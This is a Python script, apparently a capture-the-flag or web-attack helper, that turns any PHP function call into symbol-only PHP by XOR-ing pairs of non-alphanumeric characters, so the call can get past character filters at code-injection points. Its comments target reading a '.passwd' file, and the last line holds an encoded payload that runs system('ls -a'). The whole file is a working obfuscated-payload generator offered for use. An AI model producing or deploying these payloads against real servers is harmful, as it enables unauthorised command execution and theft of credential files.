def convert(function):
    funct= []
    for i in function: 
        if i in alpha:
            funct.append(alpha[i]);
        else:
            funct.append(i);
    for i in range(len(funct)):
        funct[i] = funct[i].split("^")
        for j in range(len(funct[i])):
            if funct[i][j]!="'":
                funct[i][j] = "'"+funct[i][j]+"'"
            else :
                funct[i][j] = '"'+funct[i][j]+'"'
        funct[i] = '^'.join(funct[i])
    return funct
def Generate(funct,var):
    code = ""
    for i in range(len(funct)):
        if i==0:
            code+=var+"="+funct[i]+";"
        else:
            code+=var+".="+funct[i]+";"
    return code
################################
# create nonalphanumberic base #
################################
a = "!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
alpha = {}
for i in a:
    for j in a: 
        alpha[chr(ord(i)^ord(j))] = i+"^"+j





######################################
# Generate nonalphanumberic php code #
######################################

para = []
while 1:
    function  = input("PHP function > ")
    parameter = input("parameter    > ")
    #file_get_contents('.passwd')  => file_get_contents
    # XOR  
    funct = convert(function)
    para = convert(parameter)
    if parameter != "''":
        print (function+"("+parameter+")")
        code = Generate(funct,"$_")+Generate(para,"$__")+"($_)($__);"
        print (code.replace("'~'^''^''","'~'^'^'"))
        
    else:
        print (function+"()")
        code = Generate(funct,"$_")+Generate(para,"$__")+"($_)();"
        print(code.replace("'~'^''^''","'~'^'^'"))
        
#print (Generate(para,"$__"))

#$_='_'^',';$_.='_'^'&';$_.='_'^',';$_.='_'^'+';$_.='_'^':';$_.='@'^'-';$__='|'^'[';$__.='@'^',';$__.='_'^',';$__.='~'^'^';$__.='-';$__.='_'^'>';$__.='|'^'[';($_)($__);
